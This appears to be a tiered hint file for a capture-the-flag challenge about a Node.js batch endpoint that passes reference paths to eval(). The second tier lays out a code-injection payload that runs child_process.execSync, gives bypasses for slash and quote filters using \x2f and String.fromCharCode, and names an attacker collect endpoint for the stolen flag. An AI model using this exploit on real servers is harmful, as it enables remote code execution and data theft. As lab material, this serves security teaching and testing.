tier1: The batch endpoint at POST /batch accepts a JSON array of requests and processes them sequentially. Requests can reference results from earlier requests in the same batch using a $N.property path syntax. Look at how the server resolves those references — and consider what Node.js function is commonly used to execute dynamically constructed strings.
tier2: batch.js builds a path string by resolving $N.property references via: eval('value = ref.' + parts[i].value + ';'). The URL path regex /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g splits on forward slashes, so your injected payload cannot contain /. Semicolons terminate the property access and begin your code: POST /batch with requests [{method:get,path:/profile},{method:get,path:/item},{method:get,path:/item/$1.id;YOUR_CODE}]. Use require('child_process').execSync(...) to read flags. Since / is blocked by the regex, encode it as \x2f in your JS strings. Deliver flag contents to the attacker collect endpoint: GET /api/attacker/results. For the extra mile endpoint /batch_hardened, single and double quotes are additionally blocked — bypass by constructing strings via String.fromCharCode(): require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)) equals require('child_process').
